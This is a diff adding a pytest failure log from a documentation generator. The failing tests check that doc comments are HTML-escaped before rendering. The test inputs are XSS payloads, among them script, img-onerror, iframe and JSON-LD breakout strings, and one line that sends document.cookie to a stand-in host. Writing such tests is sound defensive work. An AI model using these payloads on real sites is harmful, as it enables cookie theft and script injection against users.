@@ -1,0 +1,235 @@
+============================= test session starts =============================
+platform win32 -- Python 3.11.0, pytest-9.0.3, pluggy-1.6.0
+rootdir: C:\Users\tomhe\Documents\flipjump-docs\.claude\worktrees\happy-diffie-4e4fe8
+configfile: pyproject.toml
+collected 76 items
+
+tests\test_extractor\test_doc_attach.py ................................ [ 42%]
+.F...........FFFF.FF                                                     [ 68%]
+tests\test_extractor\test_renderer.py ................F.Fsssss           [100%]
+
+================================== FAILURES ===================================
+____________ test_assumes_override_appends_to_existing_description ____________
+
+    def test_assumes_override_appends_to_existing_description():
+        """Polish batch 6: an `@Assumes:` line is appended to the description
+        on a new paragraph, leaving prose and complexity untouched."""
+        src = """\
+    ns bit {
+        //  Time Complexity: n(2@-1)
+        //   x[:n] <<= times
+        def shl n, times, x {}
+    }
+    """
+        info = _doc(src, "shl")
+        # Original prose still there; < is HTML-escaped at the extraction boundary.
+>       assert "x[:n] &lt;&lt;= times" in info.description
+E       AssertionError: assert 'x[:n] &lt;&lt;= times' in '  `x[:n] <<= times`  \n\n@Assumes: times <= n'
+E        +  where '  `x[:n] <<= times`  \n\n@Assumes: times <= n' = DocInfo(description='  `x[:n] <<= times`  \n\n@Assumes: times <= n', time_complexity='n(2@-1)', space_complexity=None, requires=[], output_params={}, raw_doc_lines=['    //  Time Complexity: n(2@-1)', '    //   x[:n] <<= times']).description
+
+tests\test_extractor\test_doc_attach.py:561: AssertionError
+___________________ test_description_angle_brackets_escaped ___________________
+
+    def test_description_angle_brackets_escaped():
+        """Raw <tag> in a description line must be escaped to &lt;tag&gt;."""
+        src = """\
+    ns stl {
+        // This macro handles <img src=x onerror=alert(1)> edge cases
+        def op {}
+    }
+    """
+        info = _doc(src, "op")
+>       assert "<img" not in info.description
+E       AssertionError: assert '<img' not in 'This macro ...edge cases  '
+E         
+E         '<img' is contained here:
+E           This macro handles <img `src=x` `onerror=alert`(1)> edge cases  
+E         ?                    ++++
+
+tests\test_extractor\test_doc_attach.py:742: AssertionError
+_____________________ test_description_script_tag_escaped _____________________
+
+    def test_description_script_tag_escaped():
+        """A <script> breakout in a doc comment must not survive to Markdown.
+    
+        After escaping, _backtick_inline_code may further wrap the escaped
+        fragments into inline-code spans (e.g. `script&gt;`), but the live
+        HTML characters < > must not appear literally.
+        """
+        src = """\
+    ns stl {
+        // <script>alert(document.cookie)</script>
+        def evil {}
+    }
+    """
+        info = _doc(src, "evil")
+        # The critical security property: no literal < > that would form a
+        # live HTML tag when MyST renders the Markdown output. Note that
+        # _backtick_inline_code may split the escaped &gt; entity across the
+        # backtick boundary (e.g. `script&gt`; where ; follows the closing
+        # backtick), so we check for the bare &lt; / &gt prefix rather than
+        # the full 4-char entity.
+>       assert "<" not in info.description
+E       AssertionError: assert '<' not in '<`script>al.../`script>`  '
+E         
+E         '<' is contained here:
+E           <`script>alert`(document.cookie)</`script>`  
+E         ? +
+
+tests\test_extractor\test_doc_attach.py:766: AssertionError
+______________ test_description_iframe_with_external_url_escaped ______________
+
+    def test_description_iframe_with_external_url_escaped():
+        """The :// skip-path in _backtick_inline_code previously allowed a live
+        <iframe src=https://...> through. Escaping < > at source boundary blocks it."""
+        src = """\
+    ns stl {
+        // <iframe src=https://evil.example/x></iframe>
+        def op {}
+    }
+    """
+        info = _doc(src, "op")
+>       assert "<iframe" not in info.description
+E       AssertionError: assert '<iframe' not in '<iframe src...></iframe>  '
+E         
+E         '<iframe' is contained here:
+E           <iframe src=https://evil.example/x></iframe>  
+E         ? +++++++
+
+tests\test_extractor\test_doc_attach.py:782: AssertionError
+_____________ test_description_anchor_with_external_href_escaped ______________
+
+    def test_description_anchor_with_external_href_escaped():
+        """<a href=https://evil.example> must not render as a live clickable link
+        injected by a doc comment."""
+        src = """\
+    ns stl {
+        // Click <a href=https://evil.example>here</a> for more
+        def op {}
+    }
+    """
+        info = _doc(src, "op")
+>       assert "<a href" not in info.description
+E       AssertionError: assert '<a href' not in 'Click <a hr...> for more  '
+E         
+E         '<a href' is contained here:
+E           Click <a href=https://evil.example>here</a> for more  
+E         ?       +++++++
+
+tests\test_extractor\test_doc_attach.py:796: AssertionError
+__________________ test_requires_tag_angle_brackets_escaped ___________________
+
+    def test_requires_tag_angle_brackets_escaped():
+        """@requires values also come from upstream source and must be escaped."""
+        src = """\
+    ns stl {
+        // @requires <some_macro> to be called first
+        def op {}
+    }
+    """
+        info = _doc(src, "op")
+        for req in info.requires:
+>           assert "<" not in req
+E           AssertionError: assert '<' not in '<some_macro...called first'
+E             
+E             '<' is contained here:
+E               <some_macro> to be called first
+E             ? +
+
+tests\test_extractor\test_doc_attach.py:823: AssertionError
+____________________ test_output_param_description_escaped ____________________
+
+    def test_output_param_description_escaped():
+        """@output-param descriptions also come from upstream source and must be escaped."""
+        src = """\
+    ns stl {
+        // @output-param result: value <or> zero on underflow
+        def op {}
+    }
+    """
+        info = _doc(src, "op")
+        for desc in info.output_params.values():
+>           assert "<" not in desc
+E           AssertionError: assert '<' not in 'value <or> ...on underflow'
+E             
+E             '<' is contained here:
+E               value <or> zero on underflow
+E             ?       +
+
+tests\test_extractor\test_doc_attach.py:837: AssertionError
+________________ test_file_description_angle_brackets_escaped _________________
+
+tmp_path = WindowsPath('C:/Users/tomhe/AppData/Local/Temp/pytest-of-tomhe/pytest-305/test_file_description_angle_br0')
+
+    def test_file_description_angle_brackets_escaped(tmp_path):
+        """_extract_file_intro feeds {{ file_description }} which MyST renders raw.
+        A <script>/<img>/<iframe> in the leading file comment must be escaped."""
+        src = """\
+    // This file does things.
+    // <script>document.location='https://evil.example/?c='+document.cookie</script>
+    // <img src=x onerror=alert(1)>
+    // <iframe src=https://evil.example/x></iframe>
+    
+    ns stl { def loop {} }
+    """
+        render_stl(_mini_index(src, rel_path="runlib"), tmp_path)
+        page = (tmp_path / "runlib.md").read_text(encoding="utf-8")
+>       assert "<script>" not in page
+E       AssertionError: assert '<script>' not in '# `runlib.f...p--0.md)\n\n'
+E         
+E         '<script>' is contained here:
+E           # `runlib.fj`
+E           
+E           This file does things.
+E           <script>document.location='https://evil.example/?c='+document.cookie</script>
+E         ? ++++++++...
+E         
+E         ...Full output truncated (11 lines hidden), use '-vv' to show
+
+tests\test_extractor\test_renderer.py:308: AssertionError
+_____________ test_macro_page_jsonld_block_has_no_script_breakout _____________
+
+tmp_path = WindowsPath('C:/Users/tomhe/AppData/Local/Temp/pytest-of-tomhe/pytest-305/test_macro_page_jsonld_block_h0')
+
+    def test_macro_page_jsonld_block_has_no_script_breakout(tmp_path):
+        """End-to-end: a malicious first-line description must not break out
+        of the rendered macro page's JSON-LD `<script>` block."""
+        src = """\
+    ns stl {
+        // </script><img src=x onerror=alert(document.cookie)>
+        def evil {}
+    }
+    """
+        render_stl(_mini_index(src, rel_path="runlib"), tmp_path)
+        page = (tmp_path / "runlib" / "evil--0.md").read_text(encoding="utf-8")
+    
+        # Isolate the JSON-LD payload (the {raw} html passthrough that lands
+        # verbatim in the served HTML). Slice to the template's own-line
+        # closing tag (`\n</script>`), NOT the first `</script>`: on vulnerable
+        # code the injected `</script>` is inline inside the JSON string, so
+        # slicing on the first one would hide the breakout. Anchoring on the
+        # real closing tag captures the full block either way.
+        open_tag = '<script type="application/ld+json">'
+        body = page[page.index(open_tag) + len(open_tag):]
+        json_ld = body[: body.index("\n</script>")]
+        # No HTML-significant character may survive literally inside the
+        # JSON-LD — any `<`/`>` here is a breakout from the block.
+        assert "<" not in json_ld
+        assert ">" not in json_ld
+        # The payload is present but escaped: HTML-escaping converts < to &lt;,
+        # then JSON serialisation escapes & to &, so the sequence is &lt;.
+>       assert "\\u0026lt;" in json_ld
+E       assert '\\u0026lt;' in '\n{"@context": "https://schema.org", "@type": "TechArticle", "headline": "stl.evil (arity 0)", "description": "\\u003...hArticle", "name": "FlipJump Standard Library", "url": "https://fjdocs.tomhe.app/stl/"}, "proficiencyLevel": "Expert"}'
+
+tests\test_extractor\test_renderer.py:367: AssertionError
+=========================== short test summary info ===========================
+FAILED tests/test_extractor/test_doc_attach.py::test_assumes_override_appends_to_existing_description
+FAILED tests/test_extractor/test_doc_attach.py::test_description_angle_brackets_escaped
+FAILED tests/test_extractor/test_doc_attach.py::test_description_script_tag_escaped
+FAILED tests/test_extractor/test_doc_attach.py::test_description_iframe_with_external_url_escaped
+FAILED tests/test_extractor/test_doc_attach.py::test_description_anchor_with_external_href_escaped
+FAILED tests/test_extractor/test_doc_attach.py::test_requires_tag_angle_brackets_escaped
+FAILED tests/test_extractor/test_doc_attach.py::test_output_param_description_escaped
+FAILED tests/test_extractor/test_renderer.py::test_file_description_angle_brackets_escaped
+FAILED tests/test_extractor/test_renderer.py::test_macro_page_jsonld_block_has_no_script_breakout
+=================== 9 failed, 62 passed, 5 skipped in 0.68s ===================
